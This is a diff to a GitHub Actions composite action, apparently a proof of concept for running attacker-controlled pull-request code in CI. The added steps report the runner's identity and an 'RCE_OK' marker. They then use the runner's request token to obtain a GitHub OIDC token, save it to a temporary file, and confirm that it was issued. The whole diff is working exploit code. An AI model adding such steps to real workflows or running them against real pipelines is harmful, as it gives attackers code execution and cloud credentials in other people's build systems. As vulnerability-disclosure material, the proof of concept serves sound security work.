@@ -1,7 +1,24 @@
 name: KP Marker
-description: benign main-branch version
+description: PR-branch version of the local composite action (would be attacker-controlled)
 runs:
   using: "composite"
   steps:
     - shell: bash
-      run: echo "KP_MAIN_TREE_ACTION_RAN"
+      run: |
+        echo "KP_MARKER_FROM_CHECKED_OUT_REF=yes"
+        echo "KP_WORKSPACE_HEAD=$(git rev-parse HEAD)"
+        echo "KP_REPO=$GITHUB_REPOSITORY"
+        echo "KP_EVENT_NAME=$GITHUB_EVENT_NAME"
+        echo "KP_OIDC_URL_PRESENT=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
+        whoami; id
+        echo "KP_RCE_OK_$(date +%s)"
+        mkdir -p /tmp/kp
+        git rev-parse HEAD > /tmp/kp/head.txt
+    - shell: bash
+      run: |
+        set +e
+        code=$(curl -s -o /tmp/kp/oidc.json -w '%{http_code}' --max-time 20 \
+          -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
+          "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=kp-poc")
+        echo "KP_OIDC_HTTP=$code"
+        python3 -c "import json;d=json.load(open('/tmp/kp/oidc.json'));print('KP_OIDC_TOKEN_ISSUED', bool(d.get('value')))" 2>/dev/null || true
